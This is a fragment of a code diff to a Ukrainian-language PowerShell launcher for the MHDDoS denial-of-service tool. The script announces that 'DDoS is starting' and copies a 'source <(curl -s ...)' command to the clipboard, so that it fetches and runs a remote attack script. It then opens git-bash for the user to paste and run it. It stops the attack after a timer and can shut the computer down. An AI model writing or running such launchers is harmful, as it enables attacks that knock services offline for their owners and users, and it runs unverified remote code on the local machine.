@@ -87,11 +87,13 @@ if ($key -eq "Y" -or $key -eq "Enter") {
     Write-Output "По завершенню роботи виключити комп*ютер ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
     if ($key -eq "Y" -or $key -eq "Enter") {$Shutdown = $true} else {$Shutdown = $false}
 }
-Clear-Host ; Write-Output "--------------- Дудос Починається ---------------"
+Clear-Host ; Write-Output "В новому вікні вставте й запустіть команду [ПКМ] і [Enter]" ; Start-Sleep -s 5 ; Clear-Host
+Write-Output "--------------- Дудос Починається ---------------"
 Set-Clipboard -Value "source <(curl -s $mhddos_bash_clipboard)"
-Start-Process -filepath "$env:programfiles\Git\git-bash.exe" -Wait
+Start-Process -filepath "$env:programfiles\Git\git-bash.exe"
 if ($key -eq "Y" -or $key -eq "Enter") {
-    $now = (get-date) ; $future = (get-date).AddSeconds($time) ; Write-Output "Час початку: $now" ` "Час закінчення: $future" ; Start-Sleep -s $time
+    $now = (get-date) ; $future = (get-date).AddSeconds($time)
+    Write-Output "Час початку: $now" ` "Час закінчення: $future" ; Start-Sleep -s $time
     get-process | where-object {$_.MainWindowTitle -like "*c/Users*"} | stop-process
     if ($Shutdown -eq $true) {Stop-Computer -ComputerName localhost}
 }
